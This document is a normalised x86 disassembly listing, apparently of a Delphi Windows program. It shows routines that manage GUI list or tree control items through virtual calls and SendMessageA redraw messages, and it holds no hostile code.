movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
inc ebx
dec esi
jne r-xdata
lea eax [ esi + 0x1c ]
call sub_4040ac
mov eax esi
test bl bl
je r-xdata
rcl [ ebp - 0x75 ] 0xec
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_437fda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xffff
call sub_4034ac
mov [ ebp - 0x8 ] eax
mov eax edi
call sub_419720
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40528c
add esp 0x4
mov eax edi
call sub_419720
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax edi
call sub_437fe8
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
push esi
push edi
lea esi [ eax + 0xc ]
mov eax edi
call sub_419720
push eax
mov eax [ ebp - 0x8 ]
call sub_456054
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42a99c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437fe1
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405298
retn
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
inc esi
xor ebx ebx
sub_438110
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov [ edi + 0x30 ] esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ edi + 0x34 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_43815c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a814
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_43818c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a870
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x34 ]
call sub_418854
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_4382c0
mov eax esi
pop esi
pop ebx
retn
sub_4381b4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a87c
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x34 ]
call sub_418854
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_4382c0
mov eax esi
pop esi
pop ebx
retn
sub_4381f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a958
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_4188a0
mov eax [ ebx + 0x30 ]
call sub_4384a4
pop esi
pop ebx
retn
sub_438220
push ebx
push esi
mov esi edx
mov eax [ eax + 0x30 ]
call sub_4383d4
mov ebx eax
mov eax ebx
call sub_43a740
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x23c ]
call sub_419720
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_43c148
cmp [ eax + 0x24 ] 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_43c3f4
sub_438264
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_41ab90
or ecx 0xffffffff
mov edx ebx
mov eax [ esi + 0x34 ]
call sub_418a2c
lea edi [ ebx + 0x1 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx edi
mov eax esi
call sub_4382c0
inc edi
dec ebx
jne r-xdata
sub_4382a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ac6c
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_4382c0
pop esi
pop ebx
retn
sub_4382c0
push ebx
push esi
mov esi edx
mov ebx eax
push 0xffffffff
mov eax [ ebx + 0x30 ]
call sub_4388f4
push eax
mov eax ebx
call sub_438214
mov ecx esi
pop edx
call sub_42a8d0
mov edx esi
mov eax ebx
call sub_438220
pop esi
pop ebx
retn
sub_438318
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_438110
mov [ esi + 0x8 ] eax
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_438368
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov [ esi + 0x28 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp esi [ eax + 0x270 ]
jne r-xdata
mov eax esi
call sub_4383d4
call sub_456358
test al al
je r-xdata
xor edx edx
mov [ eax + 0x270 ] edx
mov eax [ esi + 0x8 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f80
test bl bl
jle r-xdata
mov eax esi
call sub_4388f4
push eax
mov eax esi
call sub_438400
pop edx
call sub_42a63c
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_438414
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov al [ esi + 0x2a ]
pop esi
pop ebx
retn
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax esi
call sub_4388f4
push eax
mov eax ebx
call sub_456054
pop edx
call sub_42a884
test eax eax
setne al
pop esi
pop ebx
retn
sub_438458
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_438414
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x2a ] bl
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x4 ]
cmp [ esi + 0x244 ] 0x0
jne r-xdata
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax edi
call sub_4388f4
push eax
mov eax esi
call sub_456054
mov ecx ebx
pop edx
call sub_42a8a4
sub_4384c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_4044b8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x24 ]
mov edx esi
call sub_404100
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov eax ebx
call sub_4383d4
call sub_43a740
test al al
je r-xdata
push 0xffffffff
mov eax ebx
call sub_4388f4
push eax
mov eax ebx
call sub_438400
xor ecx ecx
pop edx
call sub_42a8d0
mov eax ebx
call sub_4383d4
mov al [ eax + 0x229 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov eax ebx
call sub_4383d4
mov eax [ eax + 0x23c ]
call sub_419720
test eax eax
jle r-xdata
mov eax ebx
call sub_4383d4
call sub_43beec
mov eax ebx
call sub_4383d4
xor edx edx
call sub_43c148
cmp [ eax + 0x24 ] 0xffffffff
jg r-xdata
mov eax ebx
call sub_4383d4
call sub_43c3b4
sub_438570
push ebx
mov ebx eax
cmp edx [ ebx + 0xc ]
je r-xdata
pop ebx
retn
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_4383d4
mov al [ eax + 0x229 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_4383d4
call sub_43beec
sub al 0x2
jne r-xdata
sub_4385a0
push ebx
push esi
mov esi eax
cmp edx 0x4
ja r-xdata
xor ebx ebx
jmp [ edx * 4 + jump_table_4385b0 ]
mov ebx 0x4
jmp r-xdata
mov ebx 0x8
jmp r-xdata
mov ebx 0x1
jmp r-xdata
mov ebx 0x2
jmp r-xdata
mov ebx 0x20
jmp r-xdata
mov eax esi
call sub_4388f4
push eax
mov eax esi
call sub_438400
mov ecx ebx
pop edx
call sub_42a874
test eax ebx
setne al
pop esi
pop ebx
retn
sub_438608
push ebx
push esi
push edi
mov ebx eax
cmp edx 0x4
ja r-xdata
xor esi esi
jmp [ edx * 4 + jump_table_438619 ]
xor edi edi
mov edi esi
jmp r-xdata
mov esi 0x4
jmp r-xdata
mov esi 0x8
jmp r-xdata
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x20
jmp r-xdata
push esi
mov eax ebx
call sub_4388f4
push eax
mov eax ebx
call sub_438400
mov ecx edi
pop edx
call sub_42a844
pop edi
pop esi
pop ebx
retn
test cl cl
je r-xdata
sub_438678
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi eax
xor ebx ebx
sub edx 0x1
jb r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ esi + 0x10 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x1c ]
je r-xdata
dec edx
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax esi
call sub_4388f4
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_438400
mov edx esp
call sub_42a60c
jmp r-xdata
mov bl 0x1
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x20 ]
je r-xdata
jmp r-xdata
mov eax esi
call sub_4388f4
push eax
mov eax esi
call sub_4388f4
push eax
mov eax esi
call sub_4383d4
pop edx
pop ecx
call sub_43a040
push 0xf00
mov eax [ esi + 0x1c ]
inc eax
call sub_42a4f4
push eax
mov eax esi
call sub_4388f4
push eax
mov eax esi
call sub_438400
pop edx
pop ecx
call sub_42a844
jmp r-xdata
mov bl 0x1
mov [ esi + 0x20 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
push 0xf000
lea eax [ edi + 0x1 ]
call sub_42a5f0
push eax
mov eax esi
call sub_4388f4
push eax
mov eax esi
call sub_438400
pop edx
pop ecx
call sub_42a844
xor edi edi
sub_4387b4
push ebx
add esp 0xffffffd8
mov ebx eax
cmp edx [ ebx + 0x14 ]
je r-xdata
add esp 0x28
pop ebx
retn
mov [ ebx + 0x14 ] edx
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x10
mov [ esp + 0x24 ] edx
mov eax ebx
call sub_4388f4
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_438400
mov edx esp
call sub_42a60c
mov eax ebx
call sub_4388f4
push eax
mov eax ebx
call sub_4388f4
push eax
mov eax ebx
call sub_4383d4
pop edx
pop ecx
call sub_43a040
sub_438820
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418fac
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403460
mov esi eax
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_4384c0
mov edx [ esi + 0xc ]
mov eax ebx
call sub_438570
mov ecx [ esi + 0x10 ]
xor edx edx
mov eax ebx
call sub_438678
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_4387b4
mov ecx [ esi + 0x1c ]
mov edx 0x1
mov eax ebx
call sub_438678
mov ecx [ esi + 0x20 ]
mov edx 0x2
mov eax ebx
call sub_438678
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4388e0
mov eax esi
call sub_438414
mov edx eax
mov eax ebx
call sub_438458
pop esi
pop ebx
retn
sub_4388b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x24 ]
mov edx [ esi + 0x24 ]
call sub_4044b8
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
cmp eax [ esi + 0xc ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_438910
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4388f4
push eax
mov eax esi
call sub_438400
mov ecx edi
pop edx
call sub_42a69c
pop edi
pop esi
pop ebx
retn
sub_43894c
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4382f8
cmp edi eax
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov ecx edi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_43830c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax ebx
call sub_4388f4
mov [ esp + 0x4 ] eax
inc esi
mov [ esp + 0x8 ] esi
mov eax ebx
call sub_438400
mov edx esp
call sub_42a60c
sub_4389b8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4389f4
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_438b70
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_438a2c
push ebx
push esi
push edi
add esp 0xffffffd8
mov esi ecx
mov ebx eax
test edx edx
jne r-xdata
mov edi edx
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0xf8 ]
mov edi eax
jmp r-xdata
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_439390
push esp
mov eax ebx
call sub_438aa0
pop edx
call sub_42a624
mov eax edi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_438a7c
mov esi eax
test esi esi
jge r-xdata
sub_438a7c
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_456358
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_438aa0
call sub_42a5e0
pop ebx
retn
sub_438aac
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_456358
test al al
je r-xdata
mov eax esi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov [ esp ] 0x4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_438aa0
mov edx esp
call sub_42a5f4
test eax eax
je r-xdata
mov eax esp
xor ecx ecx
mov edx 0x28
call sub_402cc4
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov edx esp
mov eax [ ebx + 0x4 ]
call sub_43aa50
mov esi eax
jmp r-xdata
mov esi [ esp + 0x20 ]
sub_438b2c
push ebx
add esp 0xffffffe8
mov ebx eax
mov [ esp ] 0x1
mov [ esp + 0x8 ] edx
mov eax ebx
call sub_438aa0
mov ecx esp
or edx 0xffffffff
call sub_42a68c
add esp 0x18
pop ebx
retn
sub_438ba8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
test dl dl
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x229 ]
mov [ eax + 0x288 ] dl
xor edx edx
call sub_43bf1c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419720
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x288 ]
call sub_43bf1c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419720
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
call sub_438aa0
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43a740
test al al
je r-xdata
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
xor eax eax
push ebp
push sub_438d29
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0xb
mov eax [ ebp - 0x4 ]
call sub_438aa0
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x0
retn
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43a74c
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebx + 0x20 ] eax
mov eax ebx
call sub_437b74
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_437a1c
inc edi
dec esi
jne r-xdata
mov edx eax
mov eax ebx
call sub_437ba8
xor eax eax
mov [ ebx + 0x20 ] eax
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x264 ]
push eax
call SendMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
mov edx edi
call sub_437d4c
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
mov edx edi
call sub_437d4c
mov ebx eax
mov eax [ ebx + 0x20 ]
test eax eax
jge r-xdata
sub_438d80
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_418fac
mov eax edi
call sub_438b70
mov ebp ebx
mov eax ebp
call sub_438a7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_438aac
push eax
mov eax edi
call sub_438a20
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_438de0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov eax edi
call sub_438a7c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_438a7c
cmp ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_438a7c
test eax eax
setg bl
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_438a7c
dec eax
test eax eax
jl r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx esi
mov eax edi
call sub_438aac
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_438aac
pop edx
call sub_4388b8
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_438e70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419098
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_4390d4
push ebp
call sub_438de0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438eec
mov eax [ ebp - 0x4 ]
call sub_438b70
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax ebx
call sub_41b094
mov eax [ ebp - 0xc ]
call sub_407e80
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_439090
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ecx [ ebp - 0xc ]
sub ecx 0x4
mov eax [ ebp - 0x14 ]
lea edx [ eax + 0x4 ]
mov eax ebx
call sub_41b094
mov eax [ ebp - 0x14 ]
add eax 0x8
mov [ ebp - 0x18 ] eax
xor ebx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx eax
sub edx [ ebp - 0x14 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439097
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_40270c
retn
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_438a7c
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax + 0x14 ]
add eax 0x15
add eax [ ebp - 0x10 ]
add [ ebp - 0x18 ] eax
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_438a20
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x18 ]
add edx 0x14
call sub_404310
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
call sub_4384c0
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_438678
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x8 ]
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_438678
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x4 ]
mov edx 0x2
mov eax [ ebp - 0x20 ]
call sub_438678
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_438570
mov eax [ ebp - 0x18 ]
lea ebx [ eax + 0x14 ]
xor eax eax
mov al [ ebx ]
inc eax
add ebx eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0xc ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_404310
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
mov al [ ebx ]
lea edx [ eax + 0x1 ]
add [ ebp - 0x10 ] edx
add ebx edx
dec esi
jne r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
xor ebx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_438aac
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
movsx ecx [ edi ]
mov edx ebx
mov eax [ ebp - 0x24 ]
call sub_43894c
add edi 0x2
inc ebx
dec esi
jne r-xdata
sub_4390d4
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439369
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10 ] 0x8
mov eax [ ebp - 0x4 ]
call sub_438a7c
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
call sub_407e80
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_439347
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
call sub_438a7c
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x1c ]
add eax 0x8
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
call sub_438a7c
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_438a7c
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x14 ]
add eax 0x15
add [ ebp - 0x10 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_41b0cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43934e
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_40270c
retn
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x14 ]
add eax 0x15
add eax [ ebp - 0x18 ]
add [ ebp - 0x20 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_438aac
mov eax [ eax + 0x24 ]
call sub_4390c0
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_438aac
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_438aac
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x34 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
call sub_4390c0
inc eax
add [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x2
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_438aac
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x14
mov edx [ ebp - 0x2c ]
mov edx [ edx + 0x24 ]
mov ecx 0xff
call sub_404348
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x20 ]
add eax 0x14
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x14 ]
inc eax
add [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
lea ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x24 ]
mov ecx 0xff
call sub_404348
mov eax [ ebp - 0x24 ]
movzx eax [ eax ]
mov [ ebp - 0x14 ] eax
